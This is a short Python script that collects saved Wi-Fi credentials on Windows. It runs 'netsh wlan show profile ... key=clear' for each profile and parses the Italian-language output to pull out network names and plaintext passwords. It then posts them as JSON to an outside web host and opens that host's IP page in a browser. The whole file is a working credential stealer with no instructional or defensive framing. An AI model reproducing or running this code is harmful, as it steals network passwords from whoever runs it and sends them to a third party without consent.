import subprocess as cmd
import re
import requests as req
import json
import webbrowser 


code , pr , prs , key  = 'cp1252' , 'profile' , 'profiles' , 'Password'

commands = ['netsh', 'wlan', 'show', prs, pr, None, 'key=clear']

command_output = cmd.run(commands[0:4], capture_output = True).stdout.decode(code)

profile_names = (re.findall("Tutti i profili utente    : (.*)\r", command_output))

commands.remove(prs)

wifi_list = []

if len(profile_names) > 0:
   for name in profile_names:
      wifi_profile = {}
      commands[-2] = name
      profile_info = cmd.run(commands, capture_output = True).stdout.decode(code)
      if re.search("Chiave di sicurezza      : non presente", profile_info):
         continue
      else:
         wifi_profile['Nome'] = name
         profile_info_pass = cmd.run(commands, capture_output = True).stdout.decode(code)
         password = re.search("Contenuto chiave            : (.*)\r", profile_info_pass)
         wifi_profile[key] = None if password == None else password[1]    
         wifi_list.append(wifi_profile)
         
else:
   exit('No WLAN checked.')

base_url = 'https://matteolambertucci.altervista.org/'

req_url = ( base_url + 'wifi/' )

wifi_json = json.dumps(wifi_list)

data = { 'wifi': wifi_json }

res = req.post(req_url,data)

if(res.status_code == 200):
   ip_url = (base_url + 'ip/')
   webbrowser.open(ip_url)



